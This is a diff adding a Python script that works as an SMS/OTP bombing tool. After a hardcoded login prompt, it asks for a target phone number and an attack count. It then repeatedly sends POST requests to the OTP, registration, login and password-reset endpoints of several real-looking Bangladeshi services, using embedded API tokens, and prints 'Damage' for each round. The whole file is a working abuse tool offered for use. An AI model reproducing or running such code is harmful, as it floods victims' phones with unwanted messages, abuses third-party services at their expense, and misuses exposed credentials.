@@ -1,0 +1,164 @@
+import requests,os, sys
+from requests.structures import CaseInsensitiveDict
+
+#CVALUE
+blue= '\33[94m'
+lightblue = '\033[94m'
+red = '\033[91m'
+white = '\33[97m'
+yellow = '\33[93m'
+green = '\033[1;32m'
+cyan  = "\033[96m"
+end = '\033[0m'
+purple="\033[0;35m"
+os.system('clear')
+line=green+"===================="+red+"===================="+green+"===================="+red+"===================="+green+"===================="+red+"===================="+green+"===================="+red+"===================="+green+"===================="
+space=" "
+def logop(z):
+    for word in z + '\n':
+        sys.stdout.write(word)
+        sys.stdout.flush()
+
+# CVALUE
+blue = '\33[94m'
+lightblue = '\033[94m'
+red = '\033[91m'
+white = '\33[97m'
+yellow = '\33[93m'
+green = '\033[1;32m'
+cyan = "\033[96m"
+end = '\033[0m'
+print ("\033[32m")        
+print ("""
+
+
+   ╔═════════════════════════════════╗
+   ║ AuTHor   : SHaKiiB ツ           ║
+   ║ FaCeBooK : iTzSHaKiiB           ║
+   ║ GitHuB   : iTzSHaKiB            ║
+   ╚═════════════════════════════════╝
+
+
+
+
+""")
+
+
+
+               
+text=red+"\t\tDeveloped By : "+green+"-!-!-HD-SHaKiiB-!-!- (GhOsToFKiinG)"+green+"\n\n\t\t★★ "+cyan+" Noob DeveLoper"+green+" ★★   \n" 
+notice=""     
+def header():
+	
+	print(text)
+	print(line)
+	print(notice)
+
+#SECURITY				
+header()
+print(red+"---------------------------------------")
+print(red+"Your need to Login Befor Use The Tools")
+print("---------------------------------------")
+n=2
+while n==2:
+		a=str(input(red+"\n\n\t\t[>] UserNamE:"+green))
+		b=str(input(red+"\n\n\t\t[>] PasSWorD:"+green))
+		if a=="hdshakib" and b=="hdshakib":
+			print(green+"\n\n\t\t[ √ ] Accepted")
+			n=3
+		else:
+			
+			print(red+"\n\n\t\t[ × ] Rejected Try Again")
+			n=2
+			
+			os.system('clear')
+			header()
+print (" -!-!- WeLcOmE To SHaKiiB's FaMiLy -!-!-   ")
+
+
+number  = str(input("[>] apNar aTTack NumBer DiN: "))
+
+
+amount = int(input("[>] apNar aTTack ar PoriMaN LikHuN: "))
+
+url2 = "http://api.myguardianbd.com:80/api/requestOtp"
+
+headers2 = CaseInsensitiveDict()
+headers2["Content-Type"] = "application/x-www-form-urlencoded"
+
+headers2["Authorization"] = "Bearer 9cc7c70eaa1ac79a7f65ce8d49aae50b34434cbab373a4bd10563b83192f76a5722ce7b3c3c8662c51df329b203cb0c941c6"
+
+data2 = "new=1&device_id=40d4801634a656ee&mobile="+number
+
+url4 = "https://green-delta.com/api/api.php?action=userRegistrationForm"
+
+headers4 = CaseInsensitiveDict()
+headers4["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
+
+data4 = "firstname=KiinG&lastname=OF+GhOsT&userphone="+number+"&useremail=mdsimohoncircleking%40gmail.com&usernid=2155464684048&date_of_birth=2022-03-31&userpassword=mmmmmm&userconfirmpassword=mmmmmm&useRegistration=Registration"
+
+url5 = "http://nesco.sslwireless.com:80/api/v1/login"
+
+headers5 = CaseInsensitiveDict()
+headers5["Content-Type"] = "application/x-www-form-urlencoded"
+
+data5 = "phone_number="+number
+
+
+url = "https://rootsedulive.com/api/auth/register"
+
+headers = CaseInsensitiveDict()
+headers["Content-Type"] = "application/json"
+
+
+data = '{"name":"ghostofkiing@gmail.com","phone":"88'+number+'","email":"ghostofkiing@gmail.com","password":"mmmmmmmm","confirmPassword":"mmmmmmmm"}'
+
+url7 = "https://rootsedulive.com/api/auth/forget-password"
+
+headers7 = CaseInsensitiveDict()
+headers7["Content-Type"] = "application/json"
+
+data7 = '{"phoneOrEmail":"88'+number+'"}'
+
+url11 = "https://prodapi.swap.com.bd/api/v1/send-otp/login"
+
+headers11 = CaseInsensitiveDict()
+
+headers11["X-Authorization"]= "QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3"
+
+headers11["Content-Type"] = "application/json;charset=utf-8"
+
+data11 = '{"mobile_number":"'+number+'","referral":false}'
+
+
+url15 = "http://27.131.15.19/lstyle/api/lsotprequest"
+
+headers15 = CaseInsensitiveDict()
+
+headers15["Content-Length"]="48"
+
+headers15["Content-Type"]="application/json"
+
+data15 = """{
+  \"shortcode\": \"2494905\",
+  \"msisdn\": \"88"""+number+"""\"
+}"""
+
+
+for i in range(amount):
+	
+	resp2 = requests.post(url2, headers=headers2, data=data2)
+		
+	resp = requests.post(url, headers=headers, data=data)
+		
+	resp4 = requests.post(url4, headers=headers4, data=data4)
+		
+	resp5= requests.post(url5, headers=headers5,  data=data5)
+		
+	resp7 = requests.post(url7, headers=headers7,  data=data7)
+		
+	resp11 = requests.post(url11, headers=headers11, data=data11)
+		
+	resp15 = requests.post(url15, headers=headers15, data=data15)
+	
+	print(str (i+1)+" Damage \n")
